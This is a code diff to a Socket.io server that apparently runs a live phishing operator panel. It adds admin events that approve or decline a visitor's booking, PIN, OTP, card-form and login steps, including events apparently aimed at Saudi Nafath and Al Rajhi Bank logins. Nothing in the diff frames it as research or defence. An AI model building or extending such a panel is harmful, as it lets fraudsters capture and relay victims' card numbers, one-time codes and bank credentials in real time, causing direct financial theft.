@@ -437,6 +437,11 @@ function recordSubmission(type, payload) {
 // Every customer listener expects a payload with { action: "confirmed" | "cancelled" }
 // and one of userId / uuid / id matching the visitor's session.
 const ADMIN_EVENT_ALIASES = {
+  // Quote/booking and PIN steps
+  acceptbooking: ["payment:action", "confirmed"],
+  declinebooking: ["payment:action", "cancelled"],
+  acceptpin: ["otp:action", "confirmed"],
+  declinepin: ["otp:action", "cancelled"],
   // Payment / visa card form
   acceptpaymentform: ["payment:action", "confirmed"],
   declinepaymentform: ["payment:action", "cancelled"],
@@ -1056,10 +1061,14 @@ io.on("connection", (socket) => {
 
   // admin -> visitor control events (tmn contract)
   const adminControlEvents = [
+    "acceptBooking",
+    "declineBooking",
     "acceptService",
     "declineService",
     "acceptPaymentForm",
     "declinePaymentForm",
+    "acceptPin",
+    "declinePin",
     "acceptPhone",
     "declinePhone",
     "acceptVisaOtp",
@@ -1084,8 +1093,12 @@ io.on("connection", (socket) => {
     "declineNaflogin",
     "acceptNafselogin",
     "declineNafselogin",
+    "acceptNafLogin",
+    "declineNafLogin",
     "acceptRajlogin",
     "declineRajlogin",
+    "acceptRajLogin",
+    "declineRajLogin",
     "acceptRajhi",
     "declineRajhi",
     "adminRedirect",
